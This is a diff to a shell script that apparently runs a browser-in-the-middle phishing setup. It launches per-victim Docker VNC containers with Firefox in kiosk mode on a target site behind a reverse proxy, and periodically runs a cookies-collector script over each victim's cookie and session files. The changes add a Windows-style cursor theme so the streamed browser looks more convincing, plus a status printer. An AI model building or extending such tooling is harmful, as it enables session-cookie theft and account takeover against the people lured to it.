@@ -121,6 +121,7 @@ case "$1" in
 	    fi
 	    
 	    sleep 1
+	    sudo docker exec vnc-user$c sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
 	    sudo docker exec vnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null
 	    
 	    CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
@@ -154,7 +155,7 @@ case "$1" in
 	then
 		sudo docker run -dit -p443:443 --name rev-proxy rev-proxy /bin/bash     &> /dev/null
 	else
-		sudo docker run -dit -p80:80 --name rev-proxy rev-proxy /bin/bash      &> /dev/null
+		sudo docker run -dit -p80:80 --name rev-proxy rev-proxy /bin/bash       &> /dev/null
 	fi
 	
 	sleep 5
@@ -166,10 +167,12 @@ case "$1" in
 	fi
 	  
 	sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
-	sudo docker exec rev-proxy /bin/bash service apache2 restart  &> /dev/null 
+	sudo docker exec rev-proxy /bin/bash service apache2 restart &> /dev/null
+        
+        
         
         printf "[+] Reverse proxy running \033[0K\r\n"  
-        
+          
 	printf "[+] Setup completed \n"
 	printf "[+] Use the following URLs:\n"   
 	for value in "${urls[@]}"
@@ -204,12 +207,18 @@ case "$1" in
 		python3 ./cookies-collector.py ./user$c-cookies.sqlite default
 	   
 	   fi
+
+	   
            rm -r -f ./user$c-recovery.jsonlz4 
            rm -r -f ./user$c-cookies.sqlite
            rm -r -f ./user$c-cookies.sqlite*
-           popd &> /dev/null
+           python3 ./status.py $c "${urls[$(($c - 1))]}"
+	   
+	   popd &> /dev/null
 	done
+
 	sleep 60
+	echo -e "\033[$((($c * 3) - 2))A"
 	done
 
 	;;
